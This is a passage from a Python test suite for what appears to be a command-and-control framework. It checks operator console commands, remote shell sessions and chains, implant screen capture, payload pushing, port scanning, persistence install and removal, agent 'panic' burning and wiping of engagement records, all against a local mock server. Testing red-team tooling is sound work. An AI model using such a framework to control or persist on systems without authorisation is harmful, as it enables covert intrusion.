        assert agent.policy.get("obf") is False
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_the_console_renders_the_bulk_views():
    """The console speaks the same filter language as the server."""
    import subprocess

    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433

    token = b"operator-token-bulkcli-01234"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-cli")
    agent.start()

    env = dict(os.environ)
    env["PYTHONPATH"] = os.path.join(ROOT, "operator")
    base = [sys.executable, "-m", "umbra_cli", "--server", server.address,
            "-o", "alice", "-k", token.decode(), "--json"]

    def run(*argv: str) -> "subprocess.CompletedProcess[str]":
        return subprocess.run(base + list(argv), capture_output=True, text=True,
                              env=env, timeout=60)

    try:
        deadline = time.time() + 5
        while time.time() < deadline:
            if json.loads(run("agents").stdout):
                break
            time.sleep(0.05)

        # The tag lands on the agent and the filter finds it again.
        tagged = json.loads(run("tag", "agent-cli", "finance").stdout)
        assert tagged["updated"] == ["agent-cli"]
        rows = json.loads(run("agents", "--tag", "finance").stdout)
        assert [row["id"] for row in rows] == ["agent-cli"]

        # A bulk task through the console.
        queued = json.loads(run("task", "--agents", "agent-cli", "--filter",
                                "state=online", "--kind", "sysinfo").stdout)
        assert queued["count"] == 1
        assert queued["tasks"][0]["agent_id"] == "agent-cli"

        # And the task history can be narrowed down.
        history = json.loads(run("tasks", "--kind", "sysinfo").stdout)
        assert history and history[0]["kind"] == "sysinfo"
    finally:
        agent.stop()
        server.stop()


# ---------------------------------------------------------------------------
# Interactive sessions, multi-stage tasks and alert rules
# ---------------------------------------------------------------------------
def test_a_session_streams_its_output():
    """An interactive session: the output arrives while the task is open."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433
    from umbra_cli.client import OperatorClient  # noqa: WPS433

    token = b"operator-token-session-01234"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-session")
    agent.start()
    client = OperatorClient(server.address, token, "alice", timeout=15.0)
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline:
            if client.agents():
                break
            time.sleep(0.05)

        opened = client.open_session("agent-session", "")
        task_id = opened["task_id"]
        assert task_id

        # The session id travels with the first chunk.
        session_id = ""
        chunks = []
        deadline = time.time() + 10
        while time.time() < deadline and not session_id:
            event = client.next_event(timeout=1.0)
            if event is None:
                continue
            if event.get("kind") == "task.output" and event.get("task_id") == task_id:
                meta = event.get("data", {}).get("meta", {}) or {}
                session_id = str(meta.get("session", ""))
        assert session_id, "the session id never arrived"

        # Writing to the session echoes back as a chunk of the same stream.
        client.session_input("agent-session", session_id, b"whoami\n")
        deadline = time.time() + 10
        while time.time() < deadline:
            event = client.next_event(timeout=1.0)
            if event is None:
                continue
            if event.get("kind") == "task.output" and event.get("task_id") == task_id:
                text = event.get("data", {}).get("output", "")
                if text:
                    chunks.append(text)
                    break
        assert any("whoami" in c for c in chunks), chunks

        # The task is still open: a session has no result until it ends.
        assert client.task(task_id)["state"] == "delivered"

        # Closing the session ends the task.
        client.close_session("agent-session", session_id)
        deadline = time.time() + 10
        while time.time() < deadline:
            if client.task(task_id)["state"] in ("done", "failed"):
                break
            time.sleep(0.05)
        assert client.task(task_id)["state"] == "done"
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_a_chain_runs_the_stages_one_after_the_other():
    """The output of a stage becomes the input of the next one."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433
    from umbra_cli.client import OperatorClient  # noqa: WPS433

    token = b"operator-token-chain-012345"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-chain")
    agent.start()
    client = OperatorClient(server.address, token, "alice", timeout=15.0)
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline:
            if client.agents():
                break
            time.sleep(0.05)

        data = client.submit_chain("agent-chain", [
            {"kind": "shell", "args": {"cmd": "echo marker-42"}},
            {"kind": "shell", "args": {"cmd": "cat {{output}}"}},
        ])
        assert data["chain_id"]
        assert data["stages"] == 2

        # The second stage sees the output of the first one.
        deadline = time.time() + 15
        seen = ""
        while time.time() < deadline:
            tasks = client.tasks(agent_id="agent-chain", limit=10)
            done = [t for t in tasks if t["state"] in ("done", "failed")]
            if len(done) >= 2:
                texts = []
                for task in done:
                    raw = task.get("out", "")
                    if isinstance(raw, str):
                        raw = raw.encode()
                    texts.append(bytes(raw).decode("utf-8", "replace"))
                joined = " ".join(texts)
                if "marker-42" in joined:
                    seen = joined
                    break
            time.sleep(0.1)
        assert "marker-42" in seen, seen
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_the_alert_rules_are_visible():
    """The rules the server watches the event stream with."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import MockServer  # noqa: WPS433
    from umbra_cli.client import OperatorClient  # noqa: WPS433

    token = b"operator-token-alerts-01234"
    rules = [{"name": "agent-offline", "event": "agent.offline", "cooldown_s": 300}]
    server = MockServer(AGENT_PSK, {"alice": token}, alerts=rules)
    server.start()
    client = OperatorClient(server.address, token, "alice", timeout=15.0)
    try:
        client.connect()
        listed = client.alerts()
        assert len(listed) == 1
        assert listed[0]["name"] == "agent-offline"
        assert listed[0]["cooldown_s"] == 300
    finally:
        client.close()
        server.stop()


def test_the_screen_capture_is_turned_into_a_png():
    """The implant captures a BMP; the console saves a PNG."""
    from umbra_cli import image

    width, height = 2, 2
    stride = ((width * 3 + 3) // 4) * 4
    rows = [bytes([0, 0, 255, 0, 255, 0]) + b"\x00" * (stride - 6),
            bytes([255, 0, 0, 0, 0, 255]) + b"\x00" * (stride - 6)]
    pixels = b"".join(rows)
    header = (b"BM" + (54 + len(pixels)).to_bytes(4, "little") + b"\x00" * 4
              + (54).to_bytes(4, "little")
              + (40).to_bytes(4, "little") + width.to_bytes(4, "little")
              + height.to_bytes(4, "little") + (1).to_bytes(2, "little")
              + (24).to_bytes(2, "little") + b"\x00" * 24)
    png = image.bmp_to_png(header + pixels)
    assert png[:8] == b"\x89PNG\r\n\x1a\n"
    assert image.png_size(png) == (width, height)
    # The pixels are swapped from BGR to RGB.
    import zlib
    start = png.index(b"IDAT") + 4
    length = int.from_bytes(png[start - 8:start - 4], "big")
    raw = zlib.decompress(png[start:start + length])
    assert raw[1:4] == b"\xff\x00\x00", raw[:8]


def test_the_console_queues_a_chain_and_lists_the_alerts():
    """The console speaks the new commands."""
    import subprocess

    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433

    token = b"operator-token-chaincli-0123"
    server = MockServer(AGENT_PSK, {"alice": token},
                        alerts=[{"name": "offline", "event": "agent.offline",
                                 "cooldown_s": 60}])
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-chaincli")
    agent.start()

    env = dict(os.environ)
    env["PYTHONPATH"] = os.path.join(ROOT, "operator")
    base = [sys.executable, "-m", "umbra_cli", "--server", server.address,
            "-o", "alice", "-k", token.decode(), "--json"]

    def run(*argv: str) -> "subprocess.CompletedProcess[str]":
        return subprocess.run(base + list(argv), capture_output=True, text=True,
                              env=env, timeout=60)

    try:
        deadline = time.time() + 5
        while time.time() < deadline:
            if json.loads(run("agents").stdout):
                break
            time.sleep(0.05)

        rules = json.loads(run("alerts").stdout)
        assert rules[0]["name"] == "offline"

        queued = json.loads(run("chain", "agent-chaincli", "--stages",
                                '[{"kind":"shell","args":{"cmd":"id"}}]').stdout)
        assert queued["chain_id"]
        assert queued["stages"] == 1
    finally:
        agent.stop()
        server.stop()


def test_a_task_that_is_never_answered_fails():
    """A beacon that dies mid-task must not leave a task hanging forever."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433
    from umbra_cli.client import OperatorClient  # noqa: WPS433

    token = b"operator-token-timeout-0123"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    client = OperatorClient(server.address, token, "alice", timeout=15.0)
    try:
        client.connect()
        # A task that is still queued is not the sweep's business: the
        # agent may check in tomorrow.
        with server._lock:
            server.tasks["t-queued"] = {
                "id": "t-queued", "agent_id": "agent-x", "kind": "sysinfo",
                "args": {}, "state": "queued", "code": 0, "out": b"",
                "err": "", "created": time.time(),
            }
            # A task that was delivered and never answered.
            server.tasks["t-stuck"] = {
                "id": "t-stuck", "agent_id": "agent-x", "kind": "sysinfo",
                "args": {}, "state": "delivered", "code": 0, "out": b"",
                "err": "", "created": time.time(), "delivered": time.time() - 600,
            }
        assert server.sweep_tasks(300) == ["t-stuck"]
        assert client.task("t-queued")["state"] == "queued"
        task = client.task("t-stuck")
        assert task["state"] == "failed"
        assert "never answered" in task.get("err", "")
    finally:
        client.close()
        server.stop()


def test_a_finished_task_can_be_run_again():
    """A failed task is re-queued as a new task with the same arguments."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433
    from umbra_cli.client import OperatorClient, OperatorError  # noqa: WPS433

    token = b"operator-token-retry-0123456"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-retry", interval=0.2)
    agent.start()
    client = OperatorClient(server.address, token, "alice", timeout=15.0)
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)
        # A task that is still queued cannot be retried: it may still run.
        task_id = client.submit("agent-retry", "sysinfo", {})
        with server._lock:
            server.tasks[task_id]["state"] = "queued"
        with pytest.raises(OperatorError):
            client.retry(task_id)

        # A finished one is run again as a new task.
        with server._lock:
            server.tasks[task_id]["state"] = "failed"
            server.tasks[task_id]["err"] = "the beacon died"
            server.tasks[task_id]["args"] = {"path": "/etc"}
        res = client.retry(task_id)
        assert res["retried"] == task_id
        assert res["task_id"] != task_id
        assert res["kind"] == "sysinfo"
        again = client.task(res["task_id"])
        assert again["state"] in ("queued", "delivered", "done")
        # The old record stays as the history of what went wrong.
        assert client.task(task_id)["state"] == "failed"
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_the_server_ships_with_a_command_namespace():
    """The built-in templates are registered and one of them runs."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433
    from umbra_cli.client import OperatorClient  # noqa: WPS433

    token = b"operator-token-alias-01234"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-alias", interval=0.2)
    agent.start()
    client = OperatorClient(server.address, token, "alice", timeout=15.0)
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)
        names = [a["name"] for a in client.alias_list()]
        for expected in ("whoami", "system", "processes", "network", "triage", "find"):
            assert expected in names
        task_id = client.alias_run("system", "agent-alias")
        assert task_id
        assert client.task(task_id)["kind"] == "sysinfo"
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_the_console_writes_a_report_about_an_agent():
    """The report is what an operator hands over at the end of an engagement."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433
    from umbra_cli.client import OperatorClient  # noqa: WPS433
    from umbra_cli.cli import build_report  # noqa: WPS433

    token = b"operator-token-report-01234"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-report", interval=0.2)
    agent.start()
    client = OperatorClient(server.address, token, "alice", timeout=15.0)
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)
        report_task = client.submit("agent-report", "sysinfo", {})
        client.wait_for_result(report_task, timeout=10, poll=0.05)
        text = build_report(client, "agent-report", 20)
        assert text.startswith("# agent-report")
        assert "## The host" in text
        assert "## The tasks" in text
        assert "sysinfo" in text
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_the_journal_keeps_what_a_console_missed():
    """The live stream is for the watchers; the journal is for the rest."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433
    from umbra_cli.client import OperatorClient  # noqa: WPS433

    token = b"operator-token-journal-01234"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-journal", interval=0.2)
    agent.start()
    client = OperatorClient(server.address, token, "alice", timeout=15.0)
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)
        client.submit("agent-journal", "sysinfo", {})
        wait_until(lambda: client.events(0, 200).get("events"))

        res = client.events(0, 200)
        rows = res.get("events") or []
        assert rows, "the journal is empty"
        kinds = {row.get("kind") for row in rows}
        assert "agent.new" in kinds
        assert "task.queued" in kinds
        # The events are numbered, so a console knows what it has seen.
        seqs = [int(row.get("seq", 0)) for row in rows]
        assert seqs == sorted(seqs)
        assert res["seq"] == seqs[-1]

        # A console that reconnects asks for what it missed.
        last = seqs[-1]
        again = client.events(last, 200)
        assert (again.get("events") or []) == []
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_the_dashboard_serves_what_the_documentation_promises():
    """The dashboard's endpoints are the ones the operations guide lists.

    The dashboard is written in Go and the guide is a Markdown file, so
    nothing but a check keeps the two in step.  This is that check.
    """
    dash_dir = os.path.join(ROOT, "server", "internal", "dash")
    go = open(os.path.join(dash_dir, "dash.go"), encoding="utf-8").read()
    page = open(os.path.join(dash_dir, "index.html"), encoding="utf-8").read()
    guide = open(os.path.join(ROOT, "docs", "OPERATIONS.md"), encoding="utf-8").read()

    endpoints = ["/api/agents", "/api/tasks", "/api/events", "/api/stats", "/api/task"]
    for path in endpoints:
        assert path in go, f"{path} is not served"
        assert path in guide, f"{path} is not documented"

    # The page uses the same endpoints.
    for path in endpoints:
        assert path in page, f"{path} is not used by the page"

    # The dashboard is a local listener by default, and the deployed
    # configuration says so.
    with open(os.path.join(ROOT, "deploy", "server.prod.json"), encoding="utf-8") as fh:
        prod = json.load(fh)
    assert "dashboard_listen" in prod
    assert prod["dashboard_listen"] == ""
    assert prod["dashboard_read_only"] is True

    # The token is the operator's, and it is compared in constant time.
    assert "equalSecret" in go
    assert "Authorization" in go


def test_the_open_sessions_are_listed():
    """The operator sees which sessions are open and when they last spoke."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433
    from umbra_cli.client import OperatorClient  # noqa: WPS433

    token = b"operator-token-sessions-01234"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-sessions")
    agent.start()
    client = OperatorClient(server.address, token, "alice", timeout=15.0)
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)

        assert client.sessions() == []

        opened = client.open_session("agent-sessions", "")
        task_id = opened["task_id"]
        session_id = ""
        deadline = time.time() + 10
        while time.time() < deadline and not session_id:
            event = client.next_event(timeout=1.0)
            if event is None:
                continue
            if event.get("kind") == "task.output" and event.get("task_id") == task_id:
                meta = event.get("data", {}).get("meta", {}) or {}
                session_id = str(meta.get("session", ""))

        rows = client.sessions()
        assert rows, "the open session is not listed"
        row = rows[0]
        assert row["id"] == session_id
        assert row["agent_id"] == "agent-sessions"
        assert row["task_id"] == task_id
        assert row["last"] >= row["opened"]

        # Closing the session takes it off the list.
        client.close_session("agent-sessions", session_id)
        deadline = time.time() + 10
        while time.time() < deadline:
            if all(r["id"] != session_id for r in client.sessions()):
                break
            time.sleep(0.1)
        assert all(r["id"] != session_id for r in client.sessions())
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_the_engagement_can_be_wiped_at_the_end():
    """The record of the engagement stops existing when the operator says so."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433
    from umbra_cli.client import OperatorClient  # noqa: WPS433

    token = b"operator-token-wipe-0123456"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-wipe")
    agent.start()
    client = OperatorClient(server.address, token, "alice", timeout=15.0)
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)
        client.submit("agent-wipe", "sysinfo", {})
        wait_until(lambda: client.tasks("agent-wipe", 10))
        assert client.agents()
        assert client.tasks("agent-wipe", 10)

        res = client.wipe()
        assert res["agents"] >= 1
        assert res["tasks"] >= 1
        assert client.agents() == []
        assert client.tasks("agent-wipe", 10) == []
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_the_console_tails_and_hashes_a_file_on_an_agent():
    """A log is read from its end, and a file is compared by its digest."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433
    from umbra_cli.client import OperatorClient  # noqa: WPS433

    token = b"operator-token-tail-01234567"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-tail")
    agent.start()
    client = OperatorClient(server.address, token, "alice", timeout=15.0)
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)

        with open("/tmp/umbra-tail.log", "w", encoding="utf-8") as fh:
            fh.write("".join("line %d\n" % n for n in range(50)))

        task_id = client.submit("agent-tail", "tail",
                                {"path": "/tmp/umbra-tail.log", "lines": 3})
        deadline = time.time() + 10
        out = b""
        while time.time() < deadline:
            task = client.task(task_id)
            if task.get("state") in ("done", "failed"):
                out = task.get("out", b"")
                break
            time.sleep(0.1)
        text = out.decode() if isinstance(out, bytes) else str(out)
        assert "line 49" in text, text
        assert "line 46" not in text, text

        task_id = client.submit("agent-tail", "hash", {"path": "/tmp/umbra-tail.log"})
        deadline = time.time() + 10
        out = b""
        while time.time() < deadline:
            task = client.task(task_id)
            if task.get("state") in ("done", "failed"):
                out = task.get("out", b"")
                break
            time.sleep(0.1)
        text = out.decode() if isinstance(out, bytes) else str(out)
        assert text.startswith("sha256 "), text
        import hashlib
        with open("/tmp/umbra-tail.log", "rb") as fh:
            want = hashlib.sha256(fh.read()).hexdigest()
        assert want in text, text
    finally:
        client.close()
        agent.stop()
        server.stop()
        os.unlink("/tmp/umbra-tail.log")


def test_the_console_writes_the_report_of_the_whole_engagement():
    """The handover document: every host, every task, one file."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433
    from umbra_cli.client import OperatorClient  # noqa: WPS433
    from umbra_cli.cli import build_engagement_report  # noqa: WPS433

    token = b"operator-token-engagement-01"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-engagement", interval=0.2)
    agent.start()
    client = OperatorClient(server.address, token, "alice", timeout=15.0)
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)
        engagement_task = client.submit("agent-engagement", "sysinfo", {})
        client.wait_for_result(engagement_task, timeout=10, poll=0.05)
        text = build_engagement_report(client, 20)
        assert text.startswith("# The engagement")
        assert "## The hosts" in text
        assert "## The tasks" in text
        assert "agent-engagement" in text
        assert "sysinfo" in text
    finally:
        client.close()
        agent.stop()
        server.stop()


# ---------------------------------------------------------------------------
# capabilities, the artifact store and burning an engagement
# ---------------------------------------------------------------------------
def test_the_agent_advertises_its_capabilities():
    """A beacon says what it can do, and the server refuses the rest."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433
    from umbra_cli.client import OperatorClient, OperatorError  # noqa: WPS433

    token = b"caps-token-0123456789abcd"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-caps", interval=0.2)
    agent.start()

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)
        rows = client.agents()
        assert rows, "agent never registered"
        caps = rows[0].get("caps") or []
        assert "shell" in caps and "upload" in caps
        # The aliases are listed too, so a console that writes "cat" is not
        # told that the host cannot read a file.
        assert "cat" in caps and "exec" in caps

        # A kind the agent never said it can run is refused, and the refusal
        # names the kind instead of failing later on the target.
        with pytest.raises(OperatorError) as excinfo:
            client.submit("agent-caps", "not-a-real-kind", {})
        assert "not-a-real-kind" in str(excinfo.value)

        # A kind it did say it can run still works.
        task_id = client.submit("agent-caps", "ping", {})
        deadline = time.time() + 5
        while time.time() < deadline:
            task = client.task(task_id)
            if task.get("state") in ("done", "failed"):
                break
            time.sleep(0.05)
        assert task["state"] == "done", task
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_agents_panic_burns_the_agent():
    """A panic queues the exit and stops the server from feeding the agent."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433
    from umbra_cli.client import OperatorClient, OperatorError  # noqa: WPS433

    token = b"panic-token-0123456789abcd"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-panic", interval=0.2)
    agent.start()

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)
        assert client.agents()

        # The selection rule still applies: no targets, no panic.
        with pytest.raises(OperatorError):
            client.panic()

        res = client.panic(["agent-panic"])
        assert res["count"] == 1
        assert res["panicked"] == ["agent-panic"]

        # The exit task is queued, and the agent is marked as burned.
        kinds = [t["kind"] for t in client.tasks("agent-panic")]
        assert "exit" in kinds

        # A burned agent takes no further work.
        with pytest.raises(OperatorError) as excinfo:
            client.submit("agent-panic", "ping", {})
        assert "panic" in str(excinfo.value).lower()
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_agents_panic_needs_the_admin_role():
    """Burning an engagement is the one thing a viewer may not do."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import MockServer  # noqa: WPS433
    from umbra_cli.client import OperatorClient, OperatorError  # noqa: WPS433

    token = b"panic-role-token-0123456789"
    server = MockServer(AGENT_PSK, {"alice": token}, roles={"alice": "viewer"})
    server.start()
    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        with pytest.raises(OperatorError) as excinfo:
            client.panic(all_agents=True)
        assert "permission denied" in str(excinfo.value)
    finally:
        client.close()
        server.stop()


def test_the_artifact_store_round_trip(tmp_path):
    """A file goes into the store, comes back out and can be removed."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import MockServer  # noqa: WPS433
    from umbra_cli.client import OperatorClient, OperatorError  # noqa: WPS433

    token = b"artifact-token-0123456789ab"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()

    blob = os.urandom(1024)
    source = tmp_path / "payload.bin"
    source.write_bytes(blob)

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        info = client.artifact_upload("payload.bin", str(source))
        assert info["size"] == len(blob)
        assert info["sha256"] == hashlib.sha256(blob).hexdigest()

        rows = client.artifact_list()
        assert [r["name"] for r in rows] == ["payload.bin"]
        assert rows[0]["sha256"] == hashlib.sha256(blob).hexdigest()

        target = tmp_path / "pulled.bin"
        pulled = client.artifact_download("payload.bin", str(target))
        assert pulled["bytes"] == len(blob)
        assert target.read_bytes() == blob
        # The interrupted transfer never leaves a plausible-looking file.
        assert not (tmp_path / "pulled.bin.part").exists()

        assert client.artifact_remove("payload.bin")["removed"] is True
        assert client.artifact_list() == []
        with pytest.raises(OperatorError):
            client.artifact_remove("payload.bin")
    finally:
        client.close()
        server.stop()


def test_an_artifact_is_pushed_as_a_chain_of_uploads(tmp_path):
    """The push is a chain of ordinary upload tasks, not a new command."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433
    from umbra_cli.client import OperatorClient  # noqa: WPS433

    token = b"push-token-0123456789abcd"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-push", interval=0.2)
    agent.start()

    blob = os.urandom(4096)
    source = tmp_path / "tool.bin"
    source.write_bytes(blob)

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)
        assert client.agents()

        client.artifact_upload("tool.bin", str(source))
        res = client.artifact_push("tool.bin", "agent-push", path="/tmp/tool.bin")
        assert res["stages"] == 1
        assert res["sha256"] == hashlib.sha256(blob).hexdigest()
        assert res["path"] == "/tmp/tool.bin"

        # The chain runs the upload and the task ends up done.
        deadline = time.time() + 10
        task = {}
        while time.time() < deadline:
            task = client.task(res["task_id"])
            if task.get("state") in ("done", "failed"):
                break
            time.sleep(0.1)
        assert task.get("state") == "done", task
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_the_new_task_kinds_run_on_the_agent(tmp_path):
    """scan, resolve, env and touch are real work, not stubs."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433
    from umbra_cli.client import OperatorClient  # noqa: WPS433

    token = b"kinds-token-0123456789abcd"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-kinds", interval=0.2)
    agent.start()

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)
        assert client.agents()

        def run(kind, args):
            task_id = client.submit("agent-kinds", kind, args)
            deadline = time.time() + 10
            task = {}
            while time.time() < deadline:
                task = client.task(task_id)
                if task.get("state") in ("done", "failed"):
                    break
                time.sleep(0.1)
            assert task.get("state") == "done", (kind, task)
            out = task.get("out", b"")
            return out.decode() if isinstance(out, bytes) else str(out)

        # The environment of the agent, filtered.
        text = run("env", {"filter": "PATH"})
        assert "PATH=" in text

        # A name that always resolves.
        text = run("resolve", {"host": "localhost"})
        assert "127.0.0.1" in text or "::1" in text

        # A file that is created and stamped.
        target = tmp_path / "stamped.txt"
        text = run("touch", {"path": str(target)})
        assert "created" in text
        assert target.exists()

        # A scan of a port nothing listens on: the answer is the report.
        text = run("scan", {"host": "127.0.0.1", "ports": "1", "timeout_ms": 200})
        assert "probes" in text
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_the_console_knows_the_new_commands():
    """The parser and the client wrapper exist for every new command."""
    from umbra_cli import cli, client

    parser = cli.build_parser()
    for argv in (["artifact", "list"], ["scan", "a", "10.0.0.0/30"],
                 ["resolve", "a", "example.com"], ["env", "a"],
                 ["touch", "a", "/tmp/x"], ["panic", "a"]):
        args = parser.parse_args(argv)
        assert args.cmd == argv[0]

    # The client wrappers call the RPCs the server implements.
    captured = []

    class Stub:
        def rpc(self, cmd, args=None):
            captured.append(cmd)

            class R:
                ok = True
                data = {"count": 1, "panicked": ["a"], "artifacts": []}

            return R()

    stub = Stub()
    client.OperatorClient.panic(stub, ["a"])
    client.OperatorClient.artifact_list(stub)
    assert captured == ["agents.panic", "artifact.list"]


def test_the_state_file_keeps_binary_task_arguments():
    """A queued upload must survive a restart with the bytes it was given.

    encoding/json turns a byte slice into a base64 string, so the store
    marks the bytes before it writes the snapshot and restores them when it
    reads it back.  The marker is the only thing that keeps the two apart.
    """
    store = open(os.path.join(ROOT, "server", "internal", "store", "store.go"),
                 encoding="utf-8").read()
    assert "binMarker" in store
    assert '"__bin__"' in store
    # The marker is written on the way out and read on the way in.
    assert "encodeArgs" in store and "decodeArgs" in store
    assert "c.Args = encodeArgs(c.Args)" in store
    assert "t.Args = decodeArgs(t.Args)" in store


def test_the_persistence_lifecycle_runs_on_the_agent():
    """The whole lifecycle: install, list, verify, health, remove."""
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433
    from umbra_cli.client import OperatorClient  # noqa: WPS433

    token = b"persist-token-0123456789abc"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-persist", interval=0.2)
    agent.start()

    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        deadline = time.time() + 5
        while time.time() < deadline and not client.agents():
            time.sleep(0.05)
        assert client.agents()

        # Install: the manager picks a technique and reports the entries.
        task_id = client.submit("agent-persist", "persist", {"method": "auto"})
        task = client.wait_for_result(task_id, timeout=10)
        assert task["state"] == "done", task
        entries = (task.get("meta") or {}).get("persist") or []
        assert entries, task
        assert entries[0]["technique"]
        assert entries[0]["state"] == "installed"

        # List: the same entries come back.
        task = client.wait_for_result(
            client.submit("agent-persist", "persist.list", {}), timeout=10)
        assert task["state"] == "done", task
        listed = (task.get("meta") or {}).get("persist") or []
        assert len(listed) == len(entries)

        # Verify: every entry is still there.
        task = client.wait_for_result(
            client.submit("agent-persist", "persist.verify", {}), timeout=10)
        assert task["state"] == "done", task
        assert (task.get("meta") or {}).get("persist_broken") == 0

        # Health: one verdict for the host.
        task = client.wait_for_result(
            client.submit("agent-persist", "persist.health", {}), timeout=10)
        assert task["state"] == "done", task
        assert "covered" in (task.get("out") or b"").decode()

        # Remove: the entries are gone.
        task = client.wait_for_result(
            client.submit("agent-persist", "unpersist", {"method": "all"}), timeout=10)
        assert task["state"] == "done", task
        assert not ((task.get("meta") or {}).get("persist") or [])
